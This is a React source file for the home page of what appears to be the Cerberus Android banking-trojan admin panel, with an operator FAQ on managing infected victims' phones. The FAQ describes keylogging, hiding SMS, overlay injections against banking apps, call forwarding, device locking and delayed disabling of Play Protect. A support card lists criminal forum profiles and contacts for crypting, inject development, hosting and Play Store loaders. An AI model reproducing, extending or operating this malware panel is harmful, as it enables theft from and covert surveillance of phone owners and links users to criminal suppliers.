import React from 'react';
import BuilderConfig from './BuilderConfig';

// Домашняя страница. Пока только FAQ. Надо будет добавить стату
// TODO: добавить стату
class HomePage extends React.Component {
    render () {
        return (
            <div>
                <h1 class="animated fadeIn">Welcome to Cerberus admin panel</h1>
                <div class="row">
                    <div class="col-sm">
                        <div class="card animated fadeIn">
                            <div class="card-header">
                                <h5 class="mb0 h3info" style={({marginTop:'10px'})}>Mini FAQ</h5>
                            </div>
                            <div class="card-body">
                                <p>Left menu The left menu contains tab navigation, and statistics on bots. The statistics on bots is updated at the interval that you specified in the settings. Navigation takes place on the following tabs: General list of bots (Bots), Inject logs (Logs), List of injections for applications (Inject List), Settings (Settings).</p>
                                <p> The general list of bots (Bots) On this page you can see a table with bots. The page is made as convenient as possible so that you can perform any actions with your bots as quickly as possible. In the table, you can select one, several or all bots on the page for certain actions, you can also apply filters to remove unnecessary bots from the page. To use filtering, there is a button (Filter Table). We will tell you more about the buttons a bit later. You can also remove dead bots from the panel using the (Delete selected bots) button. When you click on this button, only selected bots from the panel will be deleted. Note: If the bot is online, it will appear in the panel again, even after uninstallation. To &quot;kill&quot; the bot, you must use the command (Bot Kill). Further there are buttons (Select All on this page) and (Clear selection). These buttons respectively select all bots on the current page in the table or remove all the selection. Inside the table there are several columns. The first column is the bot ID. This is a unique number by which you can understand from which bot this or that log came. Next is the Android version on the victim&rsquo;s device, then comes the individual name of your collected APK (Tag), then the bot&rsquo;s country is indicated, the last time the bot was online, the status bar with statistics on the operation of something. This status bar has tooltips on hover. Everything is simple enough there to understand what an icon means. Next is the indicator of the number of applications for which there are injections on the victim&rsquo;s device. Then the IP address, Date of bot infection, your unique comment and bot control buttons. The control buttons are as follows: checkbox for selecting a bot, information button (pop-up window), settings button (pop-up window).</p>
                                <p>Information Button: Here, detailed information about the current bot is indicated, and there are also buttons at the bottom for navigating to the bot logs. This is a transition directly to inject logs, hidden SMS logs and other actions, a keylogger, saved SMS, installed applications, the victim's contact list.</p>
                                <p>Settings Button: The bot has 4 basic settings, and setting up a list of working injections. 1) Hide SMS - Activates hiding SMS on the victim&rsquo;s device. Hidden SMS are saved in the bot information window (SMS, USSD, Events). 2) Lock device - Device lock function (Only for it you need admin rights on the phone) 3) Off sound - mute the sound on the device. 4) Enable keylogger - Activates the keylogger on the victim&rsquo;s device. It saves push notifications, and everything the user clicks on, or whatever he types on the keyboard. Everything is saved in the bot information window (Keylogger).</p>
                                <p>Under the table is an indicator of pages with bots, and a list of commands to the bot.</p>
                                <p>Commands for bots: Commands for bots can be activated only for selected bots. Bots have not yet implemented a command queue, and a new command will overwrite the old one if the old command is not completed. List of commands: Send SMS - send SMS. Send USSD - Send a USSD request. Forwrt call - forwarding calls from the victim&rsquo;s phone to another phone number. Open Inject - force an injection. Attention! Only injections for the applications that she has are downloaded to the victim&rsquo;s phone. If the victim does not have a specific application, then you will not open an injection for him in any way. Run app - run the application on the victim&rsquo;s phone. Send push - send push notifications to the victim&rsquo;s phone. Open URL - open the URL in a standard browser on the victim&rsquo;s phone. Get Data from bots - receiving certain information from the bot. Delete App - delete a specific application Update Module - update the main module of the bot (if a new version is released). Update App Lists - update the list of injects in the bot (in case you forgot to add an injection to the panel, and then decided to add a new injection). Kill Bots - kill selected bots.</p>
                                <p> Log tabs are quite easy to use. There you can specify a comment for each log, and see information about the log.</p>
                                <p> Injection List: You do not need to add &ldquo;ALL&rdquo; injections to the list of injections. Add only the ones you need. Above the list there are buttons for switching to the injectors generator and to the list of injections from us. To add injections, specify the HTML file, and PNG icon for the injection. In the title, indicate the technical name of the application.</p>
                                <p>Settings: Table Settings - auto-update the table. Bot time global settings - here are the settings for automatically turning on injections on the victim&rsquo;s phone. The inclusion occurs after installing the bot on the victim&rsquo;s phone after N amount of time. Bot global settings - here you can specify the settings for auto push on the victim&rsquo;s device. Play Protect offf time - disabling the drone play protect will occur after the time specified there. Links to communicate with the bot - additional links for connecting bots to the admin panel (if other domains block)</p>
                            </div>
                        </div>
                    </div>
                    
                    <div class="col-sm">
                        <div class="card animated fadeIn">
                            <div class="card-header">
                                <h5 class="mb0 h3info" style={({marginTop:'10px'})}>Support Info</h5>
                            </div>
                            <div class="card-body">
                            If u have any questions, please contact to forum profile via PM. <a class="info" href="http://xss.is/members/183497/" target="_blank">profile (XSS.IS)</a> (<a class="warn" href="http://xsstorweb56srs3a.onion/members/183497/" target="_blank">TOR</a>) , <a class="info" href="https://forum.exploit.in/profile/94074/" target="_blank">profile (EXPLOIT)</a> (<a class="warn" href="https://exploitinqx4sjro.onion/profile/94074/" target="_blank">TOR</a>) 
                            <br />
                            <br />
                            Or contact support via jabber: <span class="info">androidsupport@thesecure.biz</span>
                            <br />
                            <br />
                            <h5>Other contacts (not Cerberus team):</h5>
                            Android Crypt - jabber <span class="warn">android_crypt@draugr.de</span>
                            <br />Android Crypt - jabber2 <span class="warn">android_crypt@exploit.im </span>
                            <br />Inject developer - jabber <span class="warn">pw0ned@thesecure.biz</span>
                            <br />Inject developer - jabber2 <span class="warn">pw0ned@thesecure.biz</span>
                            <br />Inject developer - telegram <a href="https://t.me/pw0ned" target="_blank" class="warn">@pw0ned</a>
                            <br />Best server and proxy - jabber <span class="warn">nishebrod@abushost.ru</span>
                            <br />Best server and proxy - telegram <a href="https://t.me/ohyeahhellno" target="_blank" class="warn">@ohyeahhellno</a>
                            <br />Google Play loaders - jabber <span class="warn">trump3d@thesecure.biz</span>
                            </div>
                        </div>
                    </div>
                    
                    <div class="col-sm">
                        <div class="card animated fadeIn">
                            <div class="card-header">
                                <h5 class="mb0 h3info" style={({marginTop:'10px'})}>Builder</h5>
                            </div>
                            <div class="card-body builder-hr">
                                <BuilderConfig />
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        );
    }
}

export default HomePage;